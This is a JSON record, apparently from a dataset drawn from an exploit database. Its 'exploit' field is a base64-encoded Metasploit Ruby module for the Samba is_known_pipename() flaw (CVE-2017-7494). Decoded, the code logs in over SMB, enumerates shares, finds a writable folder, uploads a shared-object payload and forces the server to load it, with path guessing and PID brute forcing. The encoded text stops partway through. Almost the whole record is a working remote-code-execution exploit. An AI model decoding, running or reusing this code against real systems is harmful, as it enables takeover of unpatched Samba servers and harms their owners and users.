{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCiAgUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpEQ0VSUEMNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6U01COjpDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1NhbWJhIGlzX2tub3duX3BpcGVuYW1lKCkgQXJiaXRyYXJ5IE1vZHVsZSBMb2FkJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgICAgVGhpcyBtb2R1bGUgdHJpZ2dlcnMgYW4gYXJiaXRyYXJ5IHNoYXJlZCBsaWJyYXJ5IGxvYWQgdnVsbmVyYWJpbGl0eQ0KICAgICAgICBpbiBTYW1iYSB2ZXJzaW9ucyAzLjUuMCB0byA0LjQuMTQsIDQuNS4xMCwgYW5kIDQuNi40LiBUaGlzIG1vZHVsZQ0KICAgICAgICByZXF1aXJlcyB2YWxpZCBjcmVkZW50aWFscywgYSB3cml0ZWFibGUgZm9sZGVyIGluIGFuIGFjY2Vzc2libGUgc2hhcmUsDQogICAgICAgIGFuZCBrbm93bGVkZ2Ugb2YgdGhlIHNlcnZlci1zaWRlIHBhdGggb2YgdGhlIHdyaXRlYWJsZSBmb2xkZXIuIEluDQogICAgICAgIHNvbWUgY2FzZXMsIGFub255bW91cyBhY2Nlc3MgY29tYmluZWQgd2l0aCBjb21tb24gZmlsZXN5c3RlbSBsb2NhdGlvbnMNCiAgICAgICAgY2FuIGJlIHVzZWQgdG8gYXV0b21hdGljYWxseSBleHBsb2l0IHRoaXMgdnVsbmVyYWJpbGl0eS4NCiAgICAgIH0sDQogICAgICAnQXV0aG9yJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnc3RlZWxvIDxrbm93bnN0ZWVsb1thdF1nbWFpbC5jb20+JywgICAgIyBWdWxuZXJhYmlsaXR5IERpc2NvdmVyeQ0KICAgICAgICAgICdoZG0nLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1ldGFzcGxvaXQgTW9kdWxlDQogICAgICAgICAgJ0JyZW5kYW4gQ29sZXMgPGJjb2xlc1thdF1nbWFpbC5jb20+JywgICMgQ2hlY2sgbG9naWMNCiAgICAgICAgICAnVGF2aXMgT3JtYW5keSA8dGF2aXNvW2F0XWdvb2dsZS5jb20+JywgIyBQSUQgaHVudGluZyB0ZWNobmlxdWUNCiAgICAgICAgXSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdDVkUnLCAnMjAxNy03NDk0JyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwczovL3d3dy5zYW1iYS5vcmcvc2FtYmEvc2VjdXJpdHkvQ1ZFLTIwMTctNzQ5NC5odG1sJyBdLA0KICAgICAgICBdLA0KICAgICAgJ1BheWxvYWQnICAgICAgICAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdTcGFjZScgICAgICAgPT4gOTAwMCwNCiAgICAgICAgICAnRGlzYWJsZU5vcHMnID0+IHRydWUNCiAgICAgICAgfSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgID0+ICdsaW51eCcsDQogICAgICAjDQogICAgICAjIFRhcmdldHMgYXJlIGN1cnJlbnRseSBsaW1pdGVkIGJ5IHBsYXRmb3JtcyB3aXRoIEVMRi1TTyBwYXlsb2FkIHdyYXBwZXJzDQogICAgICAjDQogICAgICAnVGFyZ2V0cycgICAgICAgICA9Pg0KICAgICAgICBbDQoNCiAgICAgICAgICBbICdMaW51eCB4ODYnLCAgICAgICAgeyAnQXJjaCcgPT4gQVJDSF9YODYgfSBdLA0KICAgICAgICAgIFsgJ0xpbnV4IHg4Nl82NCcsICAgICB7ICdBcmNoJyA9PiBBUkNIX1g2NCB9IF0sDQogICAgICAgICAgIw0KICAgICAgICAgICMgTm90IHJlYWR5IHlldA0KICAgICAgICAgICMgWyAnTGludXggQVJNIChMRSknLCAgIHsgJ0FyY2gnID0+IEFSQ0hfQVJNTEUgfSBdLA0KICAgICAgICAgICMgWyAnTGludXggTUlQUycsICAgICAgIHsgJ0FyY2gnID0+IE1JUFMgfSBdLA0KICAgICAgICBdLA0KICAgICAgJ1ByaXZpbGVnZWQnICAgICAgPT4gdHJ1ZSwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgID0+ICdNYXIgMjQgMjAxNycsDQogICAgICAnRGVmYXVsdFRhcmdldCcgICA9PiAxKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ1NNQl9TSEFSRV9OQU1FJywgW2ZhbHNlLCAnVGhlIG5hbWUgb2YgdGhlIFNNQiBzaGFyZSBjb250YWluaW5nIGEgd3JpdGVhYmxlIGRpcmVjdG9yeSddKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnU01CX1NIQVJFX0JBU0UnLCBbZmFsc2UsICdUaGUgcmVtb3RlIGZpbGVzeXN0ZW0gcGF0aCBjb3JyZWxhdGluZyB3aXRoIHRoZSBTTUIgc2hhcmUgbmFtZSddKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnU01CX0ZPTERFUicsIFtmYWxzZSwgJ1RoZSBkaXJlY3RvcnkgdG8gdXNlIHdpdGhpbiB0aGUgd3JpdGVhYmxlIFNNQiBzaGFyZSddKSwNCiAgICAgIF0pDQoNCiAgICByZWdpc3Rlcl9hZHZhbmNlZF9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRCb29sLm5ldygnQnJ1dGVmb3JjZVBJRCcsIFtmYWxzZSwgJ0F0dGVtcHQgdG8gdXNlIHR3byBjb25uZWN0aW9ucyB0byBicnV0ZWZvcmNlIHRoZSBQSUQgd29ya2luZyBkaXJlY3RvcnknLCBmYWxzZV0pLA0KICAgICAgXSkNCiAgZW5kDQoNCg0KICBkZWYgZ2VuZXJhdGVfY29tbW9uX2xvY2F0aW9ucw0KICAgIGNhbmRpZGF0ZXMgPSBbXQ0KICAgIGlmIGRhdGFzdG9yZVsnU01CX1NIQVJFX0JBU0UnXS50b19zLmxlbmd0aCA+IDANCiAgICAgIGNhbmRpZGF0ZXMgPDwgZGF0YXN0b3JlWydTTUJfU0hBUkVfQkFTRSddDQogICAgZW5kDQoNCiAgICAlV3sgL3ZvbHVtZTEgL3ZvbHVtZTIgL3ZvbHVtZTMgL3ZvbHVtZTQNCiAgICAgICAgL3NoYXJlZCAvbW50IC9tbnQvdXNiIC9tZWRpYSAvbW50L21lZGlhDQogICAgICAgIC92YXIvc2FtYmEgL3RtcCAvaG9tZSAvaG9tZS9zaGFyZWQNCiAgICB9LmVhY2ggZG8gfGJhc2VfbmFtZXwNCiAgICAgIGNhbmRpZGF0ZXMgPDwgYmFzZV9uYW1lDQogICAgICBjYW5kaWRhdGVzIDw8IFtiYXNlX25hbWUsIEBzaGFyZV0NCiAgICAgIGNhbmRpZGF0ZXMgPDwgW2Jhc2VfbmFtZSwgQHNoYXJlLmRvd25jYXNlXQ0KICAgICAgY2FuZGlkYXRlcyA8PCBbYmFzZV9uYW1lLCBAc2hhcmUudXBjYXNlXQ0KICAgICAgY2FuZGlkYXRlcyA8PCBbYmFzZV9uYW1lLCBAc2hhcmUuY2FwaXRhbGl6ZV0NCiAgICAgIGNhbmRpZGF0ZXMgPDwgW2Jhc2VfbmFtZSwgQHNoYXJlLmdzdWIoIiAiLCAiXyIpXQ0KICAgIGVuZA0KDQogICAgY2FuZGlkYXRlcy51bmlxDQogIGVuZA0KDQogIGRlZiBlbnVtZXJhdGVfZGlyZWN0b3JpZXMoc2hhcmUpDQogICAgYmVnaW4NCiAgICAgIHNlbGYuc2ltcGxlLmNvbm5lY3QoIlxcXFwje3Job3N0fVxcI3tzaGFyZX0iKQ0KICAgICAgc3R1ZmYgPSBzZWxmLnNpbXBsZS5jbGllbnQuZmluZF9maXJzdCgiXFwqIikNCiAgICAgIGRpcmVjdG9yaWVzID0gWyIiXQ0KICAgICAgc3R1ZmYuZWFjaF9wYWlyIGRvIHxlbnRyeSxlbnRyeV9hdHRyfA0KICAgICAgICBuZXh0IGlmICVXey4gLi59LmluY2x1ZGU/KGVudHJ5KQ0KICAgICAgICBuZXh0IHVubGVzcyBlbnRyeV9hdHRyWyd0eXBlJ10gPT0gJ0QnDQogICAgICAgIGRpcmVjdG9yaWVzIDw8IGVudHJ5DQogICAgICBlbmQNCg0KICAgICAgcmV0dXJuIGRpcmVjdG9yaWVzDQoNCiAgICByZXNjdWUgOjpSZXg6OlByb3RvOjpTTUI6OkV4Y2VwdGlvbnM6OkVycm9yQ29kZSA9PiBlDQogICAgICB2cHJpbnRfZXJyb3IoIkVudW0gI3tzaGFyZX06ICN7ZX0iKQ0KICAgICAgcmV0dXJuIG5pbA0KDQogICAgZW5zdXJlDQogICAgICBpZiBzZWxmLnNpbXBsZS5zaGFyZXNbIlxcXFwje3Job3N0fVxcI3tzaGFyZX0iXQ0KICAgICAgICBzZWxmLnNpbXBsZS5kaXNjb25uZWN0KCJcXFxcI3tyaG9zdH1cXCN7c2hhcmV9IikNCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgdmVyaWZ5X3dyaXRlYWJsZV9kaXJlY3Rvcnkoc2hhcmUsIGRpcmVjdG9yeT0iIikNCiAgICBiZWdpbg0KICAgICAgc2VsZi5zaW1wbGUuY29ubmVjdCgiXFxcXCN7cmhvc3R9XFwje3NoYXJlfSIpDQoNCiAgICAgIHJhbmRvbV9maWxlbmFtZSA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoNSkrIi50eHQiDQogICAgICBmaWxlbmFtZSA9IGRpcmVjdG9yeS5sZW5ndGggPT0gMCA/ICJcXCN7cmFuZG9tX2ZpbGVuYW1lfSIgOiAiXFwje2RpcmVjdG9yeX1cXCN7cmFuZG9tX2ZpbGVuYW1lfSINCg0KICAgICAgd2ZkID0gc2ltcGxlLm9wZW4oZmlsZW5hbWUsICdyd2N0JykNCiAgICAgIHdmZCA8PCBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDgpDQogICAgICB3ZmQuY2xvc2UNCg0KICAgICAgc2ltcGxlLmRlbGV0ZShmaWxlbmFtZSkNCiAgICAgIHJldHVybiB0cnVlDQoNCiAgICByZXNjdWUgOjpSZXg6OlByb3RvOjpTTUI6OkV4Y2VwdGlvbnM6OkVycm9yQ29kZSA9PiBlDQogICAgICB2cHJpbnRfZXJyb3IoIldyaXRlICN7c2hhcmV9I3tmaWxlbmFtZX06ICN7ZX0iKQ0KICAgICAgcmV0dXJuIGZhbHNlDQoNCiAgICBlbnN1cmUNCiAgICAgIGlmIHNlbGYuc2ltcGxlLnNoYXJlc1siXFxcXCN7cmhvc3R9XFwje3NoYXJlfSJdDQogICAgICAgIHNlbGYuc2ltcGxlLmRpc2Nvbm5lY3QoIlxcXFwje3Job3N0fVxcI3tzaGFyZX0iKQ0KICAgICAgZW5kDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBzaGFyZV90eXBlKHZhbCkNCiAgICBbICdESVNLJywgJ1BSSU5URVInLCAnREVWSUNFJywgJ0lQQycsICdTUEVDSUFMJywgJ1RFTVBPUkFSWScgXVt2YWxdDQogIGVuZA0KDQogIGRlZiBlbnVtZXJhdGVfc2hhcmVzX2xhbm1hbg0KICAgIHNoYXJlcyA9IFtdDQogICAgYmVnaW4NCiAgICAgIHJlcyA9IHNlbGYuc2ltcGxlLmNsaWVudC50cmFucygNCiAgICAgICAgIlxcUElQRVxcTEFOTUFOIiwNCiAgICAgICAgKA0KICAgICAgICAgIFsweDAwXS5wYWNrKCd2JykgKw0KICAgICAgICAgICJXckxlaFx4MDAiICAgKw0KICAgICAgICAgICJCMTNCV3pceDAwIiAgKw0KICAgICAgICAgIFsweDAxLCA2NTQwNl0ucGFjaygidnYiKQ0KICAgICAgICApKQ0KICAgIHJlc2N1ZSA6OlJleDo6UHJvdG86OlNNQjo6RXhjZXB0aW9uczo6RXJyb3JDb2RlID0+IGUNCiAgICAgIHZwcmludF9lcnJvcigiQ291bGQgbm90IGVudW1lcmF0ZSBzaGFyZXMgdmlhIExBTk1BTiIpDQogICAgICByZXR1cm4gW10NCiAgICBlbmQNCiAgICBpZiByZXMubmlsPw0KICAgICAgdnByaW50X2Vycm9yKCJDb3VsZCBub3QgZW51bWVyYXRlIHNoYXJlcyB2aWEgTEFOTUFOIikNCiAgICAgIHJldHVybiBbXQ0KICAgIGVuZA0KDQogICAgbGVycm9yLCBsY29udiwgbGVudHJpZXMsIGxjb3VudCA9IHJlc1snUGF5bG9hZCddLnRvX3NbDQogICAgICByZXNbJ1BheWxvYWQnXS52WydQYXJhbU9mZnNldCddLA0KICAgICAgcmVzWydQYXlsb2FkJ10udlsnUGFyYW1Db3VudCddDQogICAgXS51bnBhY2soInY0IikNCg0KICAgIGRhdGEgPSByZXNbJ1BheWxvYWQnXS50b19zWw0KICAgICAgcmVzWydQYXlsb2FkJ10udlsnRGF0YU9mZnNldCddLA0KICAgICAgcmVzWydQYXlsb2FkJ10udlsnRGF0YUNvdW50J10NCiAgICBdDQoNCiAgICAwLnVwdG8obGVudHJpZXMgLSAxKSBkbyB8aXwNCiAgICAgIHNuYW1lLHRtcCA9IGRhdGFbKGkgKiAyMCkgKyAgMCwgMTRdLnNwbGl0KCJceDAwIikNCiAgICAgIHN0eXBlICAgICA9IGRhdGFbKGkgKiAyMCkgKyAxNCwgMl0udW5wYWNrKCd2JylbMF0NCiAgICAgIHNjb2ZmICAgICA9IGRhdGFbKGkgKiAyMCkgKyAxNiwgMl0udW5wYWNrKCd2JylbMF0NCiAgICAgIHNjb2ZmIC09IGxjb252IGlmIGxjb252ICE9IDANCiAgICAgIHNjb21tLHRtcCA9IGRhdGFbc2NvZmYsIGRhdGEubGVuZ3RoIC0gc2NvZmZdLnNwbGl0KCJceDAwIikNCiAgICAgIHNoYXJlcyA8PCBbIHNuYW1lLCBzaGFyZV90eXBlKHN0eXBlKSwgc2NvbW1dDQogICAgZW5kDQoNCiAgICBzaGFyZXMNCiAgZW5kDQoNCiAgZGVmIHByb2JlX21vZHVsZV9wYXRoKHBhdGgsIHNpbXBsZV9jbGllbnQ9c2VsZi5zaW1wbGUpDQogICAgYmVnaW4NCiAgICAgIHNpbXBsZV9jbGllbnQuY3JlYXRlX3BpcGUocGF0aCkNCiAgICByZXNjdWUgUmV4OjpQcm90bzo6U01COjpFeGNlcHRpb25zOjpFcnJvckNvZGUgPT4gZQ0KICAgICAgdnByaW50X2Vycm9yKCJQcm9iZTogI3twYXRofTogI3tlfSIpDQogICAgZW5kDQogIGVuZA0KDQogIGRlZiBmaW5kX3dyaXRlYWJsZV9wYXRoKHNoYXJlKQ0KICAgIHN1YmRpcnMgPSBlbnVtZXJhdGVfZGlyZWN0b3JpZXMoc2hhcmUpDQogICAgcmV0dXJuIHVubGVzcyBzdWJkaXJzDQoNCiAgICBpZiBkYXRhc3RvcmVbJ1NNQl9GT0xERVInXS50b19zLmxlbmd0aCA+IDANCiAgICAgIHN1YmRpcnMudW5zaGlmdChkYXRhc3RvcmVbJ1NNQl9GT0xERVInXSkNCiAgICBlbmQNCg0KICAgIHN1YmRpcnMuZWFjaCBkbyB8c3ViZGlyfA0KICAgICAgbmV4dCB1bmxlc3MgdmVyaWZ5X3dyaXRlYWJsZV9kaXJlY3Rvcnkoc2hhcmUsIHN1YmRpcikNCiAgICAgIHJldHVybiBzdWJkaXINCiAgICBlbmQNCg0KICAgIG5pbA0KICBlbmQNCg0KICBkZWYgZmluZF93cml0ZWFibGVfc2hhcmVfcGF0aA0KICAgIEBwYXRoID0gbmlsDQogICAgc2hhcmVfaW5mbyA9IGVudW1lcmF0ZV9zaGFyZXNfbGFubWFuDQogICAgaWYgZGF0YXN0b3JlWydTTUJfU0hBUkVfTkFNRSddLnRvX3MubGVuZ3RoID4gMA0KICAgICAgc2hhcmVfaW5mby51bnNoaWZ0IFtkYXRhc3RvcmVbJ1NNQl9TSEFSRV9OQU1FJ10sICdESVNLJywgJyddDQogICAgZW5kDQoNCiAgICBzaGFyZV9pbmZvLmVhY2ggZG8gfHNoYXJlfA0KICAgICAgbmV4dCBpZiBzaGFyZS5maXJzdC51cGNhc2UgPT0gJ0lQQyQnDQogICAgICBmb3VuZCA9IGZpbmRfd3JpdGVhYmxlX3BhdGgoc2hhcmUuZmlyc3QpDQogICAgICBuZXh0IHVubGVzcyBmb3VuZA0KICAgICAgQHNoYXJlID0gc2hhcmUuZmlyc3QNCiAgICAgIEBwYXRoICA9IGZvdW5kDQogICAgICBicmVhaw0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgZmluZF93cml0ZWFibGUNCiAgICBmaW5kX3dyaXRlYWJsZV9zaGFyZV9wYXRoDQogICAgdW5sZXNzIEBzaGFyZSAmJiBAcGF0aA0KICAgICAgcHJpbnRfZXJyb3IoIk5vIHN1aXRlYWJsZSBzaGFyZSBhbmQgcGF0aCB3ZXJlIGZvdW5kLCB0cnkgc2V0dGluZyBTTUJfU0hBUkVfTkFNRSBhbmQgU01CX0ZPTERFUiIpDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm9UYXJnZXQsICJObyBtYXRjaGluZyB0YXJnZXQiKQ0KICAgIGVuZA0KICAgIHByaW50X3N0YXR1cygiVXNpbmcgbG9jYXRpb24gXFxcXCN7cmhvc3R9XFwje0BzaGFyZX1cXCN7QHBhdGh9IGZvciB0aGUgcGF0aCIpDQogIGVuZA0KDQogIGRlZiB1cGxvYWRfcGF5bG9hZA0KICAgIGJlZ2luDQogICAgICBzZWxmLnNpbXBsZS5jb25uZWN0KCJcXFxcI3tyaG9zdH1cXCN7QHNoYXJlfSIpDQoNCiAgICAgIHJhbmRvbV9maWxlbmFtZSA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoOCkrIi5zbyINCiAgICAgIGZpbGVuYW1lID0gQHBhdGgubGVuZ3RoID09IDAgPyAiXFwje3JhbmRvbV9maWxlbmFtZX0iIDogIlxcI3tAcGF0aH1cXCN7cmFuZG9tX2ZpbGVuYW1lfSINCiAgICAgIHdmZCA9IHNpbXBsZS5vcGVuKGZpbGVuYW1lLCAncndjdCcpDQogICAgICB3ZmQgPDwgTXNmOjpVdGlsOjpFWEUudG9fZXhlY3V0YWJsZV9mbXQoZnJhbWV3b3JrLCB0YXJnZXQuYXJjaCwgdGFyZ2V0LnBsYXRmb3JtLA0KICAgICAgICBwYXlsb2FkLmVuY29kZWQsICJlbGYtc28iLCB7OmFyY2ggPT4gdGFyZ2V0LmFyY2gsIDpwbGF0Zm9ybSA9PiB0YXJnZXQucGxhdGZvcm19DQogICAgICApDQogICAgICB3ZmQuY2xvc2UNCg0KICAgICAgQHBheWxvYWRfbmFtZSA9IHJhbmRvbV9maWxlbmFtZQ0KICAgICAgcmV0dXJuIHRydWUNCg0KICAgIHJlc2N1ZSA6OlJleDo6UHJvdG86OlNNQjo6RXhjZXB0aW9uczo6RXJyb3JDb2RlID0+IGUNCiAgICAgIHByaW50X2Vycm9yKCJXcml0ZSAje0BzaGFyZX0je2ZpbGVuYW1lfTogI3tlfSIpDQogICAgICByZXR1cm4gZmFsc2UNCg0KICAgIGVuc3VyZQ0KICAgICAgaWYgc2VsZi5zaW1wbGUuc2hhcmVzWyJcXFxcI3tyaG9zdH1cXCN7QHNoYXJlfSJdDQogICAgICAgIHNlbGYuc2ltcGxlLmRpc2Nvbm5lY3QoIlxcXFwje3Job3N0fVxcI3tAc2hhcmV9IikNCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgZmluZF9wYXlsb2FkDQoNCiAgICAjIFJlY29ubmVjdCB0byBJUEMkDQogICAgc2ltcGxlLmNvbm5lY3QoIlxcXFwje3Job3N0fVxcSVBDJCIpDQoNCiAgICAjIExvb2sgZm9yIGNvbW1vbiBwYXRocyBmaXJzdCwgc2luY2UgdGhleSBjYW4gYmUgYSBsb3QgcXVpY2tlciB0aGFuIGh1bnRpbmcgUElEcw0KICAgIHByaW50X3N0YXR1cygiSHVudGluZyBmb3IgcGF5bG9hZCB1c2luZyBjb21tb24gcGF0aCBuYW1lczogI3tAcGF5bG9hZF9uYW1lfSAtIC8vI3tyaG9zdH0vI3tAc2hhcmV9LyN7QHBhdGh9IikNCiAgICBnZW5lcmF0ZV9jb21tb25fbG9jYXRpb25zLmVhY2ggZG8gfGxvY2F0aW9ufA0KICAgICAgdGFyZ2V0ID0gW2xvY2F0aW9uLCBAcGF0aCwgQHBheWxvYWRfbmFtZV0uam9pbigiLyIpLmdzdWIoL1wvKy8sICcvJykNCiAgICAgIHByaW50X3N0YXR1cygiVHJ5aW5nIGxvY2F0aW9uICN7dGFyZ2V0fS4uLiIpDQogICAgICBwcm9iZV9tb2R1bGVfcGF0aCh0YXJnZXQpDQogICAgZW5kDQoNCiAgICAjIEV4aXQgZWFybHkgaWYgd2UgYWxyZWFkeSBoYXZlIGEgc2Vzc2lvbg0KICAgIHJldHVybiBpZiBzZXNzaW9uX2NyZWF0ZWQ/DQoNCiAgICByZXR1cm4gdW5sZXNzIGRhdGFzdG9yZVsnQnJ1dGVmb3JjZVBJRCddDQoNCiAgICAjIFhYWDogVGhpcyB0ZWNobmlxdWUgZG9lc24ndCBzZWVtIHRvIHdvcmsgaW4gcHJhY3RpY2UsIGFzIGJvdGggcHJvY2Vzc2VzIGhhdmUgc2V0dWlkKClkDQogICAgIyAgICAgIHRvIG5vbi1yb290LCBidXQgdGhlaXIgL3Byb2MvcGlkIGRpcmVjdG9yaWVzIGFyZSBzdGlsbCBvd25lZCBieSByb290LiBUcnlpbmcgdG8NCiAgICAjICAgICAgcmVhZCB0aGUgL3Byb2Mvb3RoZXItcGlkL2N3ZC90YXJnZXQuc28gcmVzdWx0cyBpbiBwZXJtaXNzaW9uIGRlbmllZC4gVGhlcmUgaXMgYQ0KICAgICMgICAgICBnb29kIGNoYW5jZSB0aGF0IHRoaXMgc3RpbGwgd29ya3Mgb24gc29tZSBlbWJlZGRlZCBzeXN0ZW1zIGFuZCBvZGQtYmFsbCBMaW51eC4NCg0KICAgICMgVXNlIHRoZSBQSUQgaHVudGluZyBzdHJhdGVneSBkZXZpc2VkIGJ5IFRhdmlzIE9ybWFuZHkNCiAgICBwcmludF9zdGF0dXMoIkh1bnRpbmcgZm9yIHBheWxvYWQgdXNpbmcgUElEIHNlYXJjaDogI3tAcGF5bG9hZF9uYW1lfSAtIC8vI3tyaG9zdH0vI3tAc2hhcmV9LyN7QHBhdGh9IChVTkxJS0VMWSBUTyBXT1JLISkiKQ0KDQogICAgIyBDb25maWd1cmUgdGhlIG1haW4gY29ubmVjdGlvbiB0byBoYXZlIGEgd29ya2luZyBkaXJlY3Rvcnkgb2YgdGhlIGZpbGUgc2hhcmUNCiAgICBzaW1wbGUuY29ubmVjdCgiXFxcXCN7cmhvc3R9XFwje0BzaGFyZX0iKQ0KDQogICAgIyBVc2UgYSBzZWNvbmQgY29ubmVjdGlvbiB0byBicnV0ZSBmb3JjZSB0aGUgUElEIG9mIHRoZSBmaXJzdCBjb25uZWN0aW9uDQogICAgcHJvYmVfY29ubiA9IGNvbm5lY3QoZmFsc2UpDQogICAgc21iX2xvZ2luKHByb2JlX2Nvbm4pDQogICAgcHJvYmVfY29ubi5jb25uZWN0KCJcXFxcI3tyaG9zdH1cXCN7QHNoYXJlfSIpDQogICAgcHJvYmVfY29ubi5jb25uZWN0KCJcXFxcI3tyaG9zdH1cXElQQyQiKQ0KDQogICAgIyBSdW4gZnJvbSAyIHRvIE1BWF9QSUQgKHVzaG9ydCkgdHJ5aW5nIHRvIHJlYWQgdGhlIG90aGVyIHByb2Nlc3MgQ1dEDQogICAgMi51cHRvKDMyNzY4KSBkbyB8cGlkfA0KDQogICAgICAjIExvb2sgZm9yIHRoZSBQSUQgYXNzb2NpYXRlZCB3aXRoIG91ciBtYWluIFNNQiBjb25uZWN0aW9uDQogICAgICB0YXJnZXQgPSBbIi9wcm9jLyN7cGlkfS9jd2QiLCBAcGF0aCwgQHBheWxvYWRfbmFtZV0uam9pbigiLyIpLmdzdWIoL1wvKy8sICcvJykNCiAgICAgIHZwcmludF9zdGF0dXMoIlRyeWluZyBQSUQgd2l0aCB0YXJnZXQgcGF0aCAje3RhcmdldH0uLi4iKQ0KICAgICAgcHJvYmVfbW9kdWxlX3BhdGgodGFyZ2V0LCBwcm9iZV9jb25uKQ0KDQogICAgICAjIEtlZXAgb3VyIG1haW4gY29ubmVjdGlvbiBhbGl2ZQ0KICAgICAgaWYgcGlkICUgMTAwMCA9PSAwDQogICAgICAgICBzZWxmLnNpbXBsZS5jbGllbnQuZmluZF9maXJzdCgiXFwqIikNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KICAgIHJlcyA9IHNtYl9maW5nZXJwcmludA0KDQogICAgdW5sZXNzIHJlc1snbmF0aXZlX2xtJ10gPX4gL1NhbWJhIChbXGRcLl0rKS8NCiAgICAgIHByaW50X2Vycm9yKCJkb2VzIG5vdCBhcHBlYXIgdG8gYmUgU2FtYmE6ICN7cmVzWydvcyddfSAvICN7cmVzWyduYXRpdmVfbG0nXX0iKQ0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KDQogICAgc2FtYmFfdmVyc2lvbiA9IEdlbTo6VmVyc2lvbi5uZXcoJDEuZ3N1YigvXC4kLywgJycpKQ0KDQogICAgdnByaW50X3N0YXR1cygiU2FtYmEgdmVyc2lvbiBpZGVudGlmaWVkIGFzICN7c2FtYmFfdmVyc2lvbi50b19zfSIpDQoNCiAgICBpZiBzYW1iYV92ZXJzaW9uIDwgR2VtOjpWZXJzaW9uLm5ldygnMy41LjAnKQ0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KDQogICAgIyBQYXRjaGVkIGluIDQuNC4xNA0KICAgIGlmIHNhbWJhX3ZlcnNpb24gPCBHZW06OlZlcnNpb24ubmV3KCc0LjUuMCcpICYmDQogICAgICAgc2FtYmFfdmVyc2lvbiA+PSBHZW06OlZlcnNpb24ubmV3KCc0LjQuMTQnKQ0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KDQogICAgIyBQYXRjaGVkIGluIDQuNS4xMA0KICAgIGlmIHNhbWJhX3ZlcnNpb24gPiBHZW06OlZlcnNpb24ubmV3KCc0LjUuMCcpICYmDQogICAgICAgc2FtYmFfdmVyc2lvbiA8IEdlbTo6VmVyc2lvbi5uZXcoJzQuNi4wJykgJiYNCiAgICAgICBzYW1iYV92ZXJzaW9uID49IEdlbTo6VmVyc2lvbi5uZXcoJzQuNS4xMCcpDQogICAgICByZXR1cm4gQ2hlY2tDb2RlOjpTYWZlDQogICAgZW5kDQoNCiAgICAjIFBhdGNoZWQgaW4gNC42LjQNCiAgICBpZiBzYW1iYV92ZXJzaW9uID49IEdlbTo6VmVyc2lvbi5uZXcoJzQuNi40JykNCiAgICAgIHJldHVybiBDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCg0KICAgIGNvbm5lY3QNCiAgICBzbWJfbG9naW4NCiAgICBmaW5kX3dyaXRlYWJsZV9zaGFyZV9wYXRoDQogICAgZGlzY29ubmVjdA0KDQogICAgaWYgQHNoYXJlLnRvX3MubGVuZ3RoID09IDANCiAgICAgIHByaW50X3N0YXR1cygiU2FtYmEgdmVyc2lvbiAje3NhbWJhX3ZlcnNpb24udG9fc30gZm91bmQsIGJ1dCBubyB3cml0ZWFibGUgc2hhcmUgaGFzIGJlZW4gaWRlbnRpZmllZCIpDQogICAgICByZXR1cm4gQ2hlY2tDb2RlOjpEZXRlY3RlZA0KICAgIGVuZA0KDQogICAgcHJpbnRfZ29vZCgiU2FtYmEgdmVyc2lvbiAje3NhbWJhX3ZlcnNpb24udG9fc30gZm91bmQgd2l0aCB3cml0ZWFibGUgc2hhcmUgJyN7QHNoYXJlfSciKQ0KICAgIHJldHVybiBDaGVja0NvZGU6OkFwcGVhcnMNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICAjIFNldHVwIFNNQg0KICAgIGNvbm5lY3QNCiAgICBzbWJfbG9naW4NCg0KICAgICMgRmluZCBhIHdyaXRlYWJsZSBzaGFyZQ0KICAgIGZpbmRfd3JpdGVhYmxlDQoNCiAgICAjIFVwbG9hZCB0aGUgc2hhcmVkIGxpYnJhcnkgcGF5bG9hZA0KICAgIHVwbG9hZF9wYXlsb2FkDQoNCiAgICAjIEZpbmQgYW5kIGV4ZWN1dGUgdGhlIHBheWxvYWQgZnJvbSB0aGUgc2hhcmUNCiAgICBiZWdpbg0KICAgICAgZmluZF9wYXlsb2FkDQogICAgcm